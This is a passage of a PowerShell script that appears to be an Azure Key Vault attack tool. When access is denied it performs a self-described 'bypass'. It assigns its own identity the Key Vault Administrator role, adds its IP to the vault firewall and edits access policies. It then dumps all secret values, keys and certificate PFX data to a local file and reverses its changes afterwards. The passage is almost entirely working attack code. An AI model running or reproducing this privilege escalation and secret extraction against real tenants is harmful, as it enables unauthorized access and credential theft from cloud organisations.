                                    $denyD  += $p.notDataActions
                                }
                            }
                            $allowD = $allowD | Select-Object -Unique
                            $denyD  = $denyD  | Select-Object -Unique

                            $canReadSecrets =  (Test-LikeAny $allowD $denyD @('Microsoft.KeyVault/vaults/secrets/read','Microsoft.KeyVault/vaults/secrets/*')) 
                            $canReadKeys    =  (Test-LikeAny $allowD $denyD @('Microsoft.KeyVault/vaults/keys/read','Microsoft.KeyVault/vaults/keys/*')) 
                            $canReadCerts   =  (Test-LikeAny $allowD $denyD @('Microsoft.KeyVault/vaults/certificates/read','Microsoft.KeyVault/vaults/certificates/*'))
                            
                            if($canReadSecrets){
                                $ReadSecret = "Can Read Secrets"
                            }
                            if($canReadKeys){
                                $ReadKeys = "Can Read Keys"
                            }	
                            if($canReadCerts){
                                $ReadCert = "Can Read Keys"
                            }

                            $VaultToken1 = $null
                            $expectAny = $canReadSecrets -or $canReadKeys -or $canReadCerts
                            if ($expectAny) {
                                write-host "[!]Your Identity $ReadSecret, $ReadKeys, $ReadCert On this KeyVault" -ForegroundColor Green

                                if ($ClientID -and $ClientSecret -and $TenantID) {
                                    $VaultToken1 = GetVaultToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                }
                                elseif ($RefreshToken -and $TenantID){
                                    $VaultToken1 = GetVaultToken -RefreshToken $RefreshToken -TenantID $TenantID
                                }
                                else{
                                    #$VaultToken1 = $null
                                }

                                if(!$VaultToken1){
                                    Write-Host "[#]Could Not getting Vault Token..."
                                    continue
                                }

                                if($VaultToken1){
                                    $HeadersVault = @{
                                        'Authorization' = "Bearer $VaultToken1"
                                        'Accept' = "application/json"
                                        'User-Agent'    = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
                                    } 
                                    
                                    $TestSecretApI = "https://$($vaultName).vault.azure.net/secrets?api-version=7.3"
                                    $attempt3 = 0
                                    while ($true) {
                                        try{
                                            $SecretRequest = Invoke-RestMethod -Method GET -Uri $TestSecretApI -Headers $HeadersVault
                                            Write-Host "[!]Can Extracting Data From Key Vault"
                                        }catch{
                                            $attempt3++
                                            $httpResp = $_.Exception.Response
                                            $code = if ($httpResp) {
                                                        [int]$httpResp.StatusCode
                                                    } else {
                                                        $null
                                                    }
                                            if ($code -eq 401){
                                                if ($ClientID -and $ClientSecret -and $TenantID){
                                                    $VaultToken1 = GetVaultToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                                    $HeadersVault = @{
                                                        'Authorization' = "Bearer $VaultToken1"
                                                        'Accept' = "application/json"
                                                        'User-Agent'    = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
                                                    }
                                                    continue 
                                                }
                                                elseif($RefreshToken -and $TenantID){
                                                    $VaultToken1 = GetVaultToken -RefreshToken $RefreshToken -TenantID $TenantID
                                                    $HeadersVault = @{
                                                        'Authorization' = "Bearer $VaultToken1"
                                                        'Accept' = "application/json"
                                                        'User-Agent'    = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
                                                    }  
                                                    continue                                              
                                                }
                                                else{
                                                    break
                                                }
                                            }
                                            elseif($code -eq 429 -and $attempt3 -le $MaxRetries){
                                                $retryAfter = $httpResp.Headers['Retry-After']
                                                if (-not $retryAfter) {
                                                    $retryAfter = 60
                                                }
                                                Start-Sleep -Seconds ([int]$retryAfter)
                                                continue
                                            }
                                            elseif($code -eq 403){
                                            Write-Host "[!]Identity has Permission on this KeyVault But Your ip Blocked by Policy, Trying bypass.." -ForegroundColor gray
                                                $y = $False
                                                $permFW = Test-CanChangeKvFirewall -SubscriptionId $sub.SubscriptionId -HeadersARM $HeadersARM
                                                if($permFW -eq 'Good'){
                                                        $AzureARMToken = GetAzureARMToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                                        $GraphToken = GetGraphToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                                        Connect-AzAccount -AccessToken $AzureARMToken -MicrosoftGraphAccessToken $GraphToken -AccountId 1 -SubscriptionId $($sub.SubscriptionId) | out-null

                                                        write-host "[+]Bypassed, Can Modify Setting..." -ForegroundColor DarkGreen
                                                        try{
                                                            $null = New-AzRoleAssignment -RoleDefinitionName "Key Vault Administrator" -ObjectId $MyOid -Scope $VaultID -ErrorAction Stop
                                                            $y = $True
                                                        }
                                                        catch{
                                                            write-host "[-] Could not added Role Definision Name to your Identity"
                                                            $y= $False
                                                        }
                                                            if($y){
                                                            Write-Host "[+]'Key Vault Administrator' role was added successfully to your Identity"
                                                            $y= $False
                                                            }
                                                        try{
                                                            $null = Add-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP -ErrorAction Stop
                                                            $y = $True
                                                        }
                                                        catch{
                                                            write-host "[-] Could Not added yout ip to Network Rule .."
                                                            break
                                                        }
                                                            if($y){
                                                                write-host "[+]your IP Address: $MyIp Added successfully to Network Rule"
                                                                $y= $False
                                                            }

                                                        if ($ClientID -and $ClientSecret -and $TenantID){
                                                            $VaultToken1 = GetVaultToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                                        }
                                                        elseif ($RefreshToken -and $TenantID) {
                                                            $VaultToken1 =  GetVaultToken -RefreshToken $RefreshToken -TenantID $TenantID
                                                        }
                                                        else{
                                                            throw "Missing auth for Vault token"
                                                        }
                                                        $HeadersVault = @{
                                                            'Authorization' = "Bearer $VaultToken1"
                                                            'Accept' = "application/json"
                                                            'User-Agent'    = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
                                                        }

                                                        Write-Host "[!] Extracting Secrets.."
                                                        $uri = "https://$vaultName.vault.azure.net/secrets?api-version=7.4"
                                                        while ($null -ne $uri) {
                                                            try { $page = Invoke-RestMethod -Method GET -Uri $uri -Headers $HeadersVault -ErrorAction Stop }
                                                            catch { Write-Host "[-] Failed to list secrets" -ForegroundColor Red; break }

                                                            foreach ($id in $page.value.id) {
                                                            $getUri = "$($id)?api-version=7.4"

                                                                $name   = (($getUri -split '\?')[0] -split '/')[-1]
                                                                try { $resp = Invoke-RestMethod -Method GET -Uri $getUri -Headers $HeadersVault -ErrorAction Stop }
                                                                catch { continue }
                                                                
                                                                $res =  [pscustomobject]@{
                                                                    SubscriptionName = $sub.SubscriptionId
                                                                    ResourceGroup    = $ResourceGroup
                                                                    ResourceName     = $vaultName
                                                                    ResourceType     = "KeyVault-Secret"
                                                                    SecretName       = $name
                                                                    SecretValue      = $resp.value
                                                                }

                                                                $Utf8NoBom = New-Object System.Text.UTF8Encoding($false) 
                                                                $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                                [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                                $linesWritten++

                                                            }
                                                            $uri = $page.nextLink
                                                        }
                                                            
                                                        Write-Host "[!] Extracting Keys.."
                                                        $uri = "https://$vaultName.vault.azure.net/keys?api-version=7.4"
                                                        while ($null -ne $uri) {
                                                            try { $page = Invoke-RestMethod -Method GET -Uri $uri -Headers $HeadersVault -ErrorAction Stop }
                                                            catch { Write-Host "[-] Failed to list keys" -ForegroundColor Red; break }

                                                        foreach ($id in $page.value.id) {
                                                                $getUri = "$($id)?api-version=7.4"
                                                                
                                                                $name   = (($getUri -split '\?')[0] -split '/')[-1]
                                                                try { $resp = Invoke-RestMethod -Method GET -Uri $getUri -Headers $HeadersVault -ErrorAction Stop }
                                                                catch { continue }
                                                                
                                                                 $res =  [pscustomobject]@{
                                                                    SubscriptionName = $sub.SubscriptionId
                                                                    ResourceGroup    = $ResourceGroup
                                                                    ResourceName     = $vaultName
                                                                    ResourceType     = "KeyVault-Key"
                                                                    KeyName          = $name
                                                                    KeyId            = $resp.key.kid
                                                                    KeyOps           = ($resp.key.key_ops -join ',')
                                                                }
                                                                $Utf8NoBom = New-Object System.Text.UTF8Encoding($false) 
                                                                $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                                [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                                $linesWritten++
                                                            }
                                                            $uri = $page.nextLink
                                                        }

                                                        Write-Host "[!] Extracting Certificates.."
                                                        $uri = "https://$vaultName.vault.azure.net/certificates?api-version=7.4"
                                                        while ($null -ne $uri) {
                                                            try { $page = Invoke-RestMethod -Method GET -Uri $uri -Headers $HeadersVault -ErrorAction Stop }
                                                            catch { Write-Host "[-] Failed to list certificates" -ForegroundColor Red; break }

                                                            foreach ($id in $page.value.id) {
                                                                
                                                                
                                                                $name   = (($getUri -split '\?')[0] -split '/')[-1]
                                                                try { $resp = Invoke-RestMethod -Method GET -Uri $getUri -Headers $HeadersVault -ErrorAction Stop }
                                                                catch { continue }
                                                                
                                                                $res = [pscustomobject]@{
                                                                    SubscriptionName = $sub.SubscriptionId
                                                                    ResourceGroup    = $ResourceGroup
                                                                    ResourceName     = $vaultName
                                                                    ResourceType     = "KeyVault-Certificate"
                                                                    CertificateName  = $name
                                                                    CerBase64Der     = $resp.cer
                                                                }
                                                                $Utf8NoBom = New-Object System.Text.UTF8Encoding($false) 
                                                                $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                                [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                                $linesWritten++
                                                                try {
                                                                    $sec = Invoke-RestMethod -Method GET -Uri ("https://$vaultName.vault.azure.net/secrets/$name?api-version=7.4") -Headers $HeadersVault -ErrorAction Stop
                                                                    
                                                                    if ($sec.contentType -eq 'application/x-pkcs12') {
                                                                        $res = [pscustomobject]@{
                                                                            SubscriptionName = $sub.SubscriptionId
                                                                            ResourceGroup    = $ResourceGroup
                                                                            ResourceName     = $vaultName
                                                                            ResourceType     = "KeyVault-Certificate-PFX"
                                                                            CertificateName  = $name
                                                                            PfxBase64        = $sec.value
                                                                        }
                                                                        $Utf8NoBom = New-Object System.Text.UTF8Encoding($false) 
                                                                        $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                                        [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                                        $linesWritten++
                                                                    }
                                                                } catch { }
                                                            }
                                                            $uri = $page.nextLink
                                                        }
                                                    $GraphToken = GetGraphToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                                    $AzureARMToken = GetAzureARMToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                                    Connect-AzAccount -AccessToken $AzureARMToken -MicrosoftGraphAccessToken $GraphToken -AccountId 1 -SubscriptionId $($sub.SubscriptionId) | out-null

                                                        write-host "[!]Restoring changes..."
                                                        try{
                                                            $null = remove-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP -ErrorAction Stop
                                                        }
                                                        catch{
                                                        }
                                                        try{
                                                            $null = remove-AzRoleAssignment -RoleDefinitionName "Key Vault Administrator" -ObjectId $MyOid -Scope $VaultID -ErrorAction Stop                
                                                        }
                                                        catch{
                                                        }
                                                        write-host "[+]Settings restored successfully"
                                                    break
                                                }
                                                if($permFW -eq 'Bad'){
                                                    write-host "[-]Can Not Modify FW, Sotty.. Skip" -ForegroundColor Red
                                                    break
                                                }
                                            }
                                        } #end try..
                                        $y = $False
                                        $AzureARMToken = GetAzureARMToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                        $GraphToken = GetGraphToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                        Connect-AzAccount -AccessToken $AzureARMToken -MicrosoftGraphAccessToken $GraphToken -AccountId 1 -SubscriptionId $($sub.SubscriptionId) | out-null
                                        try{
                                            $null = New-AzRoleAssignment -RoleDefinitionName "Key Vault Administrator" -ObjectId $MyOid -Scope $VaultID -ErrorAction Stop
                                            $y = $True
                                            }
                                        catch{
                                            write-host "[-] Could not added Role Definision Name to your Identity"
                                            $y= $False
                                        }
                                            if($y){
                                                Write-Host "[+]'Key Vault Administrator' role was added successfully to your Identity"
                                                $y= $False
                                            }
                                        try{
                                            $null = New-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP -ErrorAction Stop
                                            $y = $True
                                        }
                                        catch{
                                        }
                                            if($y){
                                                Write-Host "[+]Your IP Address $($myIP) was successfully added to Network Rule"
                                                $y= $False
                                            }

                                        if ($ClientID -and $ClientSecret -and $TenantID){
                                                $VaultToken1 = GetVaultToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                            }
                                        elseif ($RefreshToken -and $TenantID) {
                                            $VaultToken1 =  GetVaultToken -RefreshToken $RefreshToken -TenantID $TenantID
                                        }
                                        else{
                                            throw "Missing auth for Vault token"
                                        }
                                        $HeadersVault = @{
                                            'Authorization' = "Bearer $VaultToken1"
                                            'Accept' = "application/json"
                                            'User-Agent'    = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
                                        }                                   
                                        
                                            Write-Host "[!] Extracting Secrets.."
                                            $uri = "https://$vaultName.vault.azure.net/secrets?api-version=7.4"
                                            while ($null -ne $uri) {
                                                try { $page = Invoke-RestMethod -Method GET -Uri $uri -Headers $HeadersVault -ErrorAction Stop }
                                                catch { 
                                                    Write-Host "[-] Failed to list secrets" -ForegroundColor Red
                                                    break 
                                                }
                                                
                                                foreach ($id in $page.value.id) {
                                                $getUri = "$($id)?api-version=7.4"
                                                    
                                                    $name   = (($getUri -split '\?')[0] -split '/')[-1]
                                                    try { $resp = Invoke-RestMethod -Method GET -Uri $getUri -Headers $HeadersVault -ErrorAction Stop }
                                                    catch { continue }
                                                    
                                                    $res = [pscustomobject]@{
                                                        SubscriptionName = $sub.SubscriptionId
                                                        ResourceGroup    = $ResourceGroup
                                                        ResourceName     = $vaultName
                                                        ResourceType     = "KeyVault-Secret"
                                                        SecretName       = $name
                                                        SecretValue      = $resp.value
                                                    }
                                                        $Utf8NoBom = New-Object System.Text.UTF8Encoding($false) 
                                                        $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                        [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                        $linesWritten++
                                                }
                                                $uri = $page.nextLink
                                            }
                                                
                                            Write-Host "[!] Extracting Keys.."
                                            $uri = "https://$vaultName.vault.azure.net/keys?api-version=7.4"
                                            while ($null -ne $uri) {
                                                try { $page = Invoke-RestMethod -Method GET -Uri $uri -Headers $HeadersVault -ErrorAction Stop }
                                                catch { Write-Host "[-] Failed to list keys" -ForegroundColor Red; break }

                                                    foreach ($id in $page.value.id) {
                                                    $getUri = "$($id)?api-version=7.4"
                                                    
                                                    $name   = (($getUri -split '\?')[0] -split '/')[-1]
                                                    try { $resp = Invoke-RestMethod -Method GET -Uri $getUri -Headers $HeadersVault -ErrorAction Stop }
                                                    catch { continue }
                                                     
                                                     $res = [pscustomobject]@{
                                                        SubscriptionName = $sub.SubscriptionId
                                                        ResourceGroup    = $ResourceGroup
                                                        ResourceName     = $vaultName
                                                        ResourceType     = "KeyVault-Key"
                                                        KeyName          = $name
                                                        KeyId            = $resp.key.kid
                                                        KeyOps           = ($resp.key.key_ops -join ',')
                                                    }
                                                        $Utf8NoBom = New-Object System.Text.UTF8Encoding($false) 
                                                        $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                        [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                        $linesWritten++
                                                }
                                                $uri = $page.nextLink
                                            }

                                            Write-Host "[!] Extracting Certificates.."
                                            $uri = "https://$vaultName.vault.azure.net/certificates?api-version=7.4"
                                            while ($null -ne $uri) {
                                                try { $page = Invoke-RestMethod -Method GET -Uri $uri -Headers $HeadersVault -ErrorAction Stop }
                                                catch { Write-Host "[-] Failed to list certificates" -ForegroundColor Red; break }

                                                foreach ($id in $page.value.id) {
                                                    $getUri = "$($id)?api-version=7.4"
                                                    
                                                    $name   = (($getUri -split '\?')[0] -split '/')[-1]
                                                    try { $resp = Invoke-RestMethod -Method GET -Uri $getUri -Headers $HeadersVault -ErrorAction Stop }
                                                    catch { continue }
                                                    
                                                    $res = [pscustomobject]@{
                                                        SubscriptionName = $sub.SubscriptionId
                                                        ResourceGroup    = $ResourceGroup
                                                        ResourceName     = $vaultName
                                                        ResourceType     = "KeyVault-Certificate"
                                                        CertificateName  = $name
                                                        CerBase64Der     = $resp.cer
                                                    }
                                                        $Utf8NoBom = New-Object System.Text.UTF8Encoding($false) 
                                                        $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                        [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                        $linesWritten++
                                                    try {
                                                        $sec = Invoke-RestMethod -Method GET -Uri ("https://$vaultName.vault.azure.net/secrets/$name?api-version=7.4") -Headers $HeadersVault -ErrorAction Stop
                                                        write-host "[debug] $sec.vaule"
                                                        if ($sec.contentType -eq 'application/x-pkcs12') {
                                                            $res = [pscustomobject]@{
                                                                SubscriptionName = $sub.SubscriptionId
                                                                ResourceGroup    = $ResourceGroup
                                                                ResourceName     = $vaultName
                                                                ResourceType     = "KeyVault-Certificate-PFX"
                                                                CertificateName  = $name
                                                                PfxBase64        = $sec.value
                                                            }
                                                        $Utf8NoBom = New-Object System.Text.UTF8Encoding($false) 
                                                        $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                        [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                        $linesWritten++
                                                        }
                                                    } catch { }
                                                }    
                                            $uri = $page.nextLink
                                            }

                                            try{
                                                $null = remove-AzRoleAssignment -RoleDefinitionName "Key Vault Administrator" -ObjectId $MyOid -Scope $VaultID -ErrorAction Stop 
                                            }
                                            catch{

                                            }
                                            try{
                                                $null = remove-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP -ErrorAction Stop
                                            }
                                            catch{

                                            }                           
                                            
                                        break
                                    } #while end
                                }else{
                                    write-host "Could not recive Token"
                                }
                            }else{
                            Write-Host "[*]Identity has no Permission on this KeyVault,Trying bypass.." -ForegroundColor gray
                                $roledefCheck = Test-CanChangeKvRoleAssigmnet -SubscriptionId $($sub.SubscriptionId) -HeadersARM $HeadersARM
                                if($roledefCheck -eq 'Good'){
                                    $y = $False
                                    $GraphToken = GetGraphToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                    $AzureARMToken = GetAzureARMToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                    Connect-AzAccount -AccessToken $AzureARMToken -MicrosoftGraphAccessToken $GraphToken -AccountId 1 -SubscriptionId $($sub.SubscriptionId) | out-null

                                    write-host "[+]Bypassed, Can Modify Setting..." -ForegroundColor DarkGreen                                    
                                    try{
                                        $null = New-AzRoleAssignment -RoleDefinitionName "Key Vault Administrator" -ObjectId $MyOid -Scope $VaultID -ErrorAction Stop
                                        $y = $True
                                    }
                                    catch{
                                        write-host "[-] Could not added Role Definision Name to your Identity"
                                        $y= $False
                                    }
                                        if($y){
                                            Write-Host "[+]'Key Vault Administrator' role was added successfully to your Identity"
                                            $y= $False
                                        }
                                    try{
                                        $null = Add-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP -ErrorAction Stop
                                        $y = $True
                                    }
                                    catch{
                                        write-host "[-] Could Not added yout ip to Network Rule .."
                                        continue
                                    }
                                        if($y){
                                            write-host "[+]your IP Address: $MyIp Added successfully to Network Rule"
                                            $y = $False
                                        }
                                    if ($ClientID -and $ClientSecret -and $TenantID){
                                        $VaultToken1 = GetVaultToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                    }
                                    elseif ($RefreshToken -and $TenantID) {
                                        $VaultToken1 =  GetVaultToken -RefreshToken $RefreshToken -TenantID $TenantID
                                    }
                                    else{
                                        throw "Missing auth for Vault token"
                                    }
                                    $HeadersVault = @{
                                        'Authorization' = "Bearer $VaultToken1"
                                        'Accept' = "application/json"
                                        'User-Agent'    = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
                                    }
    
                                    Write-Host "[!] Extracting Secrets.."
                                    $uri = "https://$vaultName.vault.azure.net/secrets?api-version=7.4"
                                    while ($null -ne $uri) {
                                        try { $page = Invoke-RestMethod -Method GET -Uri $uri -Headers $HeadersVault -ErrorAction Stop }
                                        catch { Write-Host "[-] Failed to list secrets" -ForegroundColor Red; break }

                                        foreach ($id in $page.value.id) {
                                            $getUri = "$($id)?api-version=7.4"
                                            
                                            $name   = (($getUri -split '\?')[0] -split '/')[-1]
                                            try { $resp = Invoke-RestMethod -Method GET -Uri $getUri -Headers $HeadersVault -ErrorAction Stop }
                                            catch { continue }
                                            
                                                $res = [pscustomobject]@{
                                                    SubscriptionName = $sub.SubscriptionId
                                                    ResourceGroup    = $ResourceGroup
                                                    ResourceName     = $vaultName
                                                    ResourceType     = "KeyVault-Secret"
                                                    SecretName       = $name
                                                    SecretValue      = $resp.value
                                                }
                                                    $Utf8NoBom = New-Object System.Text.UTF8Encoding($false) 
                                                    $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                    [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                    $linesWritten++
                                            }
                                            $uri = $page.nextLink
                                        }

                                    Write-Host "[!] Extracting Keys.."
                                    $uri = "https://$vaultName.vault.azure.net/keys?api-version=7.4"
                                    while ($null -ne $uri) {
                                        try { $page = Invoke-RestMethod -Method GET -Uri $uri -Headers $HeadersVault -ErrorAction Stop }
                                        catch { Write-Host "[-] Failed to list keys" -ForegroundColor Red; break }

                                            foreach ($id in $page.value.id) {
                                                $getUri = "$($id)?api-version=7.4"
                                                
                                                $name   = (($getUri -split '\?')[0] -split '/')[-1]
                                                try { $resp = Invoke-RestMethod -Method GET -Uri $getUri -Headers $HeadersVault -ErrorAction Stop }
                                                catch { continue }
                                                
                                                $res = [pscustomobject]@{
                                                    SubscriptionName = $sub.SubscriptionId
                                                    ResourceGroup    = $ResourceGroup
                                                    ResourceName     = $vaultName
                                                    ResourceType     = "KeyVault-Key"
                                                    KeyName          = $name
                                                    KeyId            = $resp.key.kid
                                                    KeyOps           = ($resp.key.key_ops -join ',')
                                                }
                                                    $Utf8NoBom = New-Object System.Text.UTF8Encoding($false) 
                                                    $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                    [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                    $linesWritten++
                                            }
                                            $uri = $page.nextLink
                                        }
                                        
                                    Write-Host "[!] Extracting Certificates.."
                                    $uri = "https://$vaultName.vault.azure.net/certificates?api-version=7.4"
                                    while ($null -ne $uri) {
                                        try { $page = Invoke-RestMethod -Method GET -Uri $uri -Headers $HeadersVault -ErrorAction Stop }
                                        catch { Write-Host "[-] Failed to list certificates" -ForegroundColor Red; break }

                                            foreach ($id in $page.value.id) {
                                                $getUri = "$($id)?api-version=7.4"
                                                
                                                $name   = (($getUri -split '\?')[0] -split '/')[-1]
                                                try { $resp = Invoke-RestMethod -Method GET -Uri $getUri -Headers $HeadersVault -ErrorAction Stop }
                                                catch { continue }
                                               
                                                $res = [pscustomobject]@{
                                                    SubscriptionName = $sub.SubscriptionId
                                                    ResourceGroup    = $ResourceGroup
                                                    ResourceName     = $vaultName
                                                    ResourceType     = "KeyVault-Certificate"
                                                    CertificateName  = $name
                                                    CerBase64Der     = $resp.cer
                                                }
                                                    $Utf8NoBom = New-Object System.Text.UTF8Encoding($false) 
                                                    $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                    [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                    $linesWritten++
                                                try {
                                                    $sec = Invoke-RestMethod -Method GET -Uri ("https://$vaultName.vault.azure.net/secrets/$name?api-version=7.4") -Headers $HeadersVault -ErrorAction Stop
                                                    
                                                    if ($sec.contentType -eq 'application/x-pkcs12') {
                                                         $res = [pscustomobject]@{
                                                            SubscriptionName = $sub.SubscriptionId
                                                            ResourceGroup    = $ResourceGroup
                                                            ResourceName     = $vaultName
                                                            ResourceType     = "KeyVault-Certificate-PFX"
                                                            CertificateName  = $name
                                                            PfxBase64        = $sec.value
                                                        }
                                                    $Utf8NoBom = New-Object System.Text.UTF8Encoding($false) 
                                                    $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                    [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                    $linesWritten++
                                                    }
                                                } catch { }
                                            }
                                            $uri = $page.nextLink
                                        }
                                    $GraphToken = GetGraphToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                    $AzureARMToken = GetAzureARMToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                    Connect-AzAccount -AccessToken $AzureARMToken -MicrosoftGraphAccessToken $GraphToken -AccountId 1 -SubscriptionId $($sub.SubscriptionId) | out-null

                                    write-host "[!]Restoring changes..."
                                    try{
                                       $null = remove-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP -ErrorAction Stop
                                    }
                                    catch{  }
                                    try{
                                        $null = remove-AzRoleAssignment -RoleDefinitionName "Key Vault Administrator" -ObjectId $MyOid -Scope $VaultID -ErrorAction Stop
                                        continue
                                    }
                                    catch{
                                        continue
                                    }
                                    write-host "[+]Settings restored successfully"
                                }
                                if($permFW -eq 'Bad'){
                                    write-host "[-]Can Not Modify Setting.. Skipping.." -ForegroundColor Red
                                    continue
                                }
                            }
                        } 
                        else{
                            write-host"no param needs to develop...."
                        }
                    }
                        elseif($mode -eq 'AccessPolicy'){
                            $claims = Get-JwtClaims -Jwt $AzureARMToken
                            $MyOid   = $claims.oid
                            $CheckAccessPolicies = $kvDetail.properties.accessPolicies
                            if($CheckAccessPolicies){
                                $match = $CheckAccessPolicies | Where-Object { $_.objectId -eq $MyOid } | Select-Object -First 1
                                if($match){
                                    $oidMatch = $true
                                    $s = @($match.permissions.secrets)       | Where-Object { $_ -in @('get','list','backup','restore') }
                                    $k = @($match.permissions.keys)          | Where-Object { $_ -in @('get','list','decrypt','unwrapKey','backup','restore') }
                                    $c = @($match.permissions.certificates)  | Where-Object { $_ -in @('get','list','backup','restore') }
                                    $canReadSecrets = [bool]$s
                                    $canReadKeys    = [bool]$k
                                    $canReadCerts   = [bool]$c

                                    if($canReadSecrets -or $canReadKeys -or $canReadCerts){
                                        write-host "[+]Identity Can Read Data, Trying to extract:" -ForegroundColor Green
                                        

                                        if ($ClientID -and $ClientSecret -and $TenantID){
                                            $VaultToken1 = GetVaultToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                        }
                                        elseif ($RefreshToken -and $TenantID) {
                                            $VaultToken1 =  GetVaultToken -RefreshToken $RefreshToken -TenantID $TenantID
                                        }
                                        else{
                                            throw "Missing auth for Vault token"
                                        }
                                        $HeadersVault = @{
                                            'Authorization' = "Bearer $VaultToken1"
                                            'Accept' = "application/json"
                                            'User-Agent'    = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
                                        }
                                        
                                        $GraphToken = GetGraphToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                        $AzureARMToken = GetAzureARMToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                        Connect-AzAccount -AccessToken $AzureARMToken -MicrosoftGraphAccessToken $GraphToken -AccountId 1 -SubscriptionId $($sub.SubscriptionId) | out-null
                                        try{
                                            $null = Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ResourceGroupName $ResourceGroup -ObjectId $MyOid -PermissionsToSecrets Get, List -PermissionsToKeys Get, List -PermissionsToCertificates Get, List -ErrorAction Stop
                                        }
                                        catch{

                                        }
                                        try{
                                            $null = Add-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP -ErrorAction Stop
                                        }
                                        catch{

                                        }

                                        Write-Host "[!] Extracting Secrets.."
                                        $uri = "https://$vaultName.vault.azure.net/secrets?api-version=7.4"
                                        while ($null -ne $uri) {
                                            try { $page = Invoke-RestMethod -Method GET -Uri $uri -Headers $HeadersVault -ErrorAction Stop }
                                            catch { Write-Host "[-] Failed to list secrets" -ForegroundColor Red; break }

                                            foreach ($id in $page.value.id) {
                                                $getUri = "$($id)?api-version=7.4"
                                                
                                                $name   = (($getUri -split '\?')[0] -split '/')[-1]
                                                try { $resp = Invoke-RestMethod -Method GET -Uri $getUri -Headers $HeadersVault -ErrorAction Stop }
                                                catch { continue }
                                                
                                                    $res = [pscustomobject]@{
                                                        SubscriptionName = $sub.SubscriptionId
                                                        ResourceGroup    = $ResourceGroup
                                                        ResourceName     = $vaultName
                                                        ResourceType     = "KeyVault-Secret"
                                                        SecretName       = $name
